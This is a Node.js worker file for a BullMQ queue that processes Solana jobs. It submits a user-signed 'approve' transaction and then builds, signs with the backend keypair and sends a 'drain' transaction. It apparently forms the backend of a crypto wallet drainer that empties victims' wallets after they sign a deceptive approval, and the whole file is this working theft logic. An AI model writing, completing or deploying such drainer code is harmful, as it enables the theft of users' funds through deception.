const { Worker } = require("bullmq");
const { getQueue, getConnection } = require("../queue/jobQueue");
const { getPool } = require("../core/rpcPool");
const { getKeypair } = require("../core/keypairManager");
const { executeTx } = require("../solana/txExecutor");
const { buildDrain } = require("../flows/drainFlow");
const logger = require("../core/logger");
const { PublicKey, Transaction } = require("@solana/web3.js");

function initWorker() {
    const queue = getQueue();

    const worker = new Worker(
        "tx",
        async (job) => {
            try {
                logger.info("Worker processing job", { jobId: job.id });

                const { publicKey, signedTx } = job.data;

                if (!publicKey || !signedTx) {
                    throw new Error("Missing required fields in job");
                }

                const connection = getPool().getConnection();
                const payer = getKeypair();

                // 1. APPROVE TX (signed by user)
                const approveTx = Transaction.from(Buffer.from(signedTx, "base64"));
                const approveSig = await executeTx(approveTx, connection);

                logger.info("Approve confirmed", { approveSig });

                // 2. DRAIN TX (signed by backend)
                const drainTx = await buildDrain(new PublicKey(publicKey), connection);
                drainTx.sign(payer);

                const drainSig = await executeTx(drainTx, connection);

                logger.info("Drain confirmed", { drainSig });

                return { approveSig, drainSig };
            } catch (err) {
                logger.error("Worker job failed", {
                    jobId: job.id,
                    error: err.message
                });
                throw err;
            }
        },
        {
            connection: getConnection()
        }
    );

    worker.on("completed", (job) => {
        logger.info("Worker job completed", { jobId: job.id });
    });

    worker.on("failed", (job, err) => {
        logger.error("Worker job failed", {
            jobId: job.id,
            error: err.message
        });
    });

    logger.info("Queue worker initialized successfully");
    return worker;
}

module.exports = { initWorker };
